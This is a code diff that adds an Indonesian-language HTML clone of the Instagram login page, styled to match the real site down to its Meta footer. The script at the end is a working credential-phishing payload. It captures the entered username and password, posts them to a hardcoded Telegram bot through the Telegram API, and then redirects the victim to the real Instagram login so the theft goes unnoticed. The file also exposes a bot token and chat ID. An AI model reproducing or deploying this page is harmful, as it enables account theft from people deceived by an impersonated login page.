@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Instagram Login Clone</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      /* Gaya CSS Anda tetap sama seperti sebelumnya */
+      @import url("https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap");
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: #fff;
+      }
+      .instagram-logo {
+        font-family: "Grand Hotel", cursive;
+        font-size: 42px;
+        text-align: center;
+        user-select: none;
+      }
+      .cards-container {
+        perspective: 800px;
+        width: 320px;
+        height: 420px;
+        position: relative;
+      }
+      .card {
+        width: 220px;
+        height: 380px;
+        border-radius: 24px;
+        box-shadow: 0 4px 15px rgb(0 0 0 / 0.15);
+        position: absolute;
+        top: 0;
+        left: 0;
+        background: #fff;
+        overflow: hidden;
+        transition: transform 0.3s ease;
+      }
+      .card:nth-child(1) {
+        left: -80px;
+        top: 30px;
+        transform: rotateZ(-15deg);
+        z-index: 1;
+      }
+      .card:nth-child(2) {
+        left: 0;
+        top: 0;
+        z-index: 3;
+      }
+      .card:nth-child(3) {
+        left: 70px;
+        top: 40px;
+        transform: rotateZ(15deg);
+        z-index: 2;
+      }
+      .card img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        border-radius: 24px;
+        user-select: none;
+      }
+      .heart-icon {
+        position: absolute;
+        bottom: 20px;
+        right: 20px;
+        border: 2px solid white;
+        border-radius: 9999px;
+        padding: 5px 8px;
+        color: white;
+        cursor: pointer;
+        background: rgba(0, 0, 0, 0.3);
+        font-size: 20px;
+        user-select: none;
+      }
+      .speech-bubble {
+        position: absolute;
+        top: 16px;
+        left: 30%;
+        background: #fff;
+        padding: 7px 14px;
+        border-radius: 20px;
+        box-shadow: 0 5px 10px rgb(0 0 0 / 0.15);
+        font-size: 14px;
+        display: flex;
+        gap: 8px;
+        user-select: none;
+      }
+      .star-check {
+        position: absolute;
+        top: 40px;
+        right: 10px;
+        background-color: #10b981;
+        border-radius: 9999px;
+        color: white;
+        font-weight: 700;
+        padding: 4px 12px;
+        font-size: 14px;
+        user-select: none;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .ring-profile {
+        position: absolute;
+        bottom: 60px;
+        right: -30px;
+        width: 68px;
+        height: 68px;
+        border-radius: 9999px;
+        border: 3px solid;
+        border-image-slice: 1;
+        border-width: 3px;
+        border-image-source: linear-gradient(
+          45deg,
+          #f09433,
+          #e6683c,
+          #dc2743,
+          #cc2366,
+          #bc1888
+        );
+        background: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .ring-profile img {
+        width: 60px;
+        height: 60px;
+        border-radius: 9999px;
+        object-fit: cover;
+        user-select: none;
+      }
+      .form-container {
+        width: 290px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      input[type="text"],
+      input[type="password"] {
+        height: 38px;
+        border: 1px solid #dbdbdb;
+        border-radius: 4px;
+        padding: 0 10px;
+        font-size: 14px;
+        outline-offset: 2px;
+      }
+      input[type="text"]::placeholder,
+      input[type="password"]::placeholder {
+        color: #999;
+      }
+      button.login-btn {
+        background-color: #7390f0;
+        border: none;
+        border-radius: 5px;
+        height: 36px;
+        font-weight: 600;
+        color: white;
+        cursor: pointer;
+        margin-top: 6px;
+        transition: background-color 0.3s ease;
+      }
+      button.login-btn:hover {
+        background-color: #5975e1;
+      }
+      .divider {
+        margin: 12px 0;
+        text-align: center;
+        color: #999;
+        font-weight: 600;
+        position: relative;
+      }
+      .divider::before,
+      .divider::after {
+        content: "";
+        position: absolute;
+        top: 12px;
+        width: 40%;
+        height: 1px;
+        background: #dbdbdb;
+      }
+      .divider::before {
+        left: 0;
+      }
+      .divider::after {
+        right: 0;
+      }
+      .facebook-login {
+        color: #1877f2;
+        font-weight: 600;
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        cursor: pointer;
+        user-select: none;
+        text-decoration: none;
+      }
+      .facebook-login svg {
+        width: 16px;
+        height: 16px;
+      }
+      .links-center {
+        margin-top: 12px;
+        font-size: 12px;
+        user-select: none;
+      }
+      .links-center a {
+        color: #385898;
+        font-weight: 600;
+        text-decoration: none;
+      }
+      .links-center a:hover {
+        text-decoration: underline;
+      }
+      footer {
+        margin-top: 40px;
+        font-size: 12px;
+        color: #999;
+        text-align: center;
+        user-select: none;
+      }
+      footer > div:first-child {
+        margin-bottom: 12px;
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 12px;
+      }
+      footer > div:first-child a {
+        color: #999;
+        text-decoration: none;
+      }
+      footer > div:first-child a:hover {
+        text-decoration: underline;
+      }
+      footer > div:last-child {
+        font-weight: 500;
+      }
+      @media (max-width: 900px) {
+        .main-container {
+          flex-direction: column;
+          align-items: center;
+          gap: 36px;
+          padding: 30px 20px;
+        }
+        .cards-container {
+          width: 280px;
+          height: 350px;
+        }
+        .card {
+          width: 180px;
+          height: 310px;
+        }
+        .card:nth-child(1) {
+          left: -60px;
+          top: 24px;
+        }
+        .card:nth-child(3) {
+          left: 50px;
+          top: 32px;
+        }
+        .ring-profile {
+          width: 52px;
+          height: 52px;
+          bottom: 50px;
+          right: -20px;
+        }
+        .ring-profile img {
+          width: 44px;
+          height: 44px;
+        }
+        .form-container {
+          width: 260px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="min-h-screen flex items-center justify-center p-8">
+      <div class="main-container flex gap-24 select-none max-w-[1000px] w-full">
+        <section class="cards-container relative flex-shrink-0">
+          <div class="card" aria-label="Photo with man dancing">
+            <img
+              src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/4ba5aebc-cb3e-44f7-9925-be37eea79f3b.png"
+              alt="Young man dancing in bright orange outfit with orange background"
+            />
+            <div class="heart-icon" aria-label="Like Heart">❤</div>
+          </div>
+          <div
+            class="card"
+            aria-label="Photo with two women taking selfie photo"
+          >
+            <img
+              src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/d32bcba3-36d0-4908-bfbb-27dd0ff38a03.png"
+              alt="Two young women taking a selfie outdoors with blue sky, grass and trees"
+            />
+            <div
+              class="speech-bubble"
+              aria-label="Reaction icons: fire, diamond, purple heart"
+            >
+              <span>🔥</span>
+              <span>💎</span>
+              <span style="color: #9b59b6">💜</span>
+            </div>
+            <div
+              style="
+                position: absolute;
+                bottom: 15px;
+                left: 10px;
+                right: 10px;
+                height: 5px;
+                border: 1.5px solid rgba(255, 255, 255, 0.6);
+                border-radius: 9999px;
+              "
+            >
+              <div
+                style="
+                  width: 60%;
+                  height: 5px;
+                  background: white;
+                  border-radius: 9999px;
+                "
+              ></div>
+            </div>
+            <div class="heart-icon" style="bottom: 15px; right: 10px">♡</div>
+          </div>
+          <div class="card" aria-label="Photo with man and nested profile">
+            <img
+              src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/694302fd-1a00-4902-9f03-1d2e69335a4e.png"
+              alt="Young man listening to music with inline earphones and purple background"
+            />
+            <div class="star-check">⭐ ✓</div>
+            <div
+              class="ring-profile"
+              aria-label="Profile picture with gradient Instagram ring"
+            >
+              <img
+                src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/faa153a4-26b7-4f94-919d-eb689b943aad.png"
+                alt="Young boy with blue hat smiling profile picture ring with Instagram gradient ring"
+              />
+            </div>
+          </div>
+        </section>
+        <section class="flex flex-col w-full max-w-[320px]">
+          <h1 class="instagram-logo mb-6" aria-label="Instagram logo">
+            Instagram
+          </h1>
+          <form class="form-container" id="login-form" aria-label="Login form">
+            <input
+              type="text"
+              id="username"
+              placeholder="Nomor telepon, nama pengguna, atau email"
+              aria-label="Nomor telepon, nama pengguna, atau email"
+              autocomplete="username"
+              required
+            />
+            <input
+              type="password"
+              id="password"
+              placeholder="Kata Sandi"
+              aria-label="Kata Sandi"
+              autocomplete="current-password"
+              required
+            />
+            <button type="submit" class="login-btn" aria-label="Login button">
+              Masuk
+            </button>
+          </form>
+          <div class="divider" role="presentation">ATAU</div>
+          <a href="#" class="facebook-login" aria-label="Login with Facebook">
+            <svg
+              aria-hidden="true"
+              focusable="false"
+              data-prefix="fab"
+              data-icon="facebook-f"
+              class="svg-inline--fa fa-facebook-f fa-w-10"
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 320 512"
+              fill="#1877f2"
+            >
+              <path
+                d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06H293V6.26S259.27 0 225.36 0c-73 0-121.14 44.38-121.14 124.72v70.62H22.89V288h81.33v224h100.17V288z"
+              ></path>
+            </svg>
+            Masuk dengan Facebook
+          </a>
+          <p class="links-center mt-4 font-semibold text-sm">
+            <a href="#" aria-label="Lupa kata sandi?">Lupa kata sandi?</a>
+          </p>
+          <p class="links-center mt-4">
+            Belum punya akun? <a href="#" aria-label="Buat akun">Buat akun</a>
+          </p>
+        </section>
+      </div>
+    </main>
+    <footer>
+      <div>
+        <a href="#">Meta</a>
+        <a href="#">Tentang</a>
+        <a href="#">Blog</a>
+        <a href="#">Pekerjaan</a>
+        <a href="#">Bantuan</a>
+        <a href="#">API</a>
+        <a href="#">Privasi</a>
+        <a href="#">Ketentuan</a>
+        <a href="#">Lokasi</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Pengunggahan</a>
+        <a href="#">Kontak & Nonpengguna</a>
+        <a href="#">Verifikasi Meta</a>
+        <a href="#">Meta di Indonesia</a>
+      </div>
+      <div>Bahasa Indonesia © 2025 Instagram from Meta</div>
+    </footer>
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", async function (event) {
+          event.preventDefault(); // Mencegah form submit default
+
+          // Ambil nilai input
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+
+          // Ganti dengan token bot Anda
+          const botToken = "8483797691:AAFY2fQnbsQi5ojEzjaXa4Qq24QU6QqkupY";
+          const chatId = "1954718231";
+          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+          // Format pesan yang akan dikirim ke Telegram
+          const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+          try {
+            // Kirim pesan ke Telegram API
+            const telegramResponse = await fetch(telegramApiUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+              }),
+            });
+
+            const telegramResult = await telegramResponse.json();
+            if (telegramResult.ok) {
+              console.log("Data berhasil dikirim ke Telegram!");
+              // Arahkan ke halaman login Instagram resmi dengan username
+              const instagramLoginUrl = `https://www.instagram.com/accounts/login/?username=${encodeURIComponent(
+                username
+              )}`;
+              window.location.href = instagramLoginUrl;
+            } else {
+              console.log(
+                "Gagal mengirim data ke Telegram: " + telegramResult.description
+              );
+              alert(
+                "Gagal mengirim data ke Telegram: " + telegramResult.description
+              );
+            }
+          } catch (error) {
+            console.error("Error:", error);
+            alert("Terjadi kesalahan saat mengirim data ke Telegram.");
+          }
+        });
+    </script>
+  </body>
+</html>
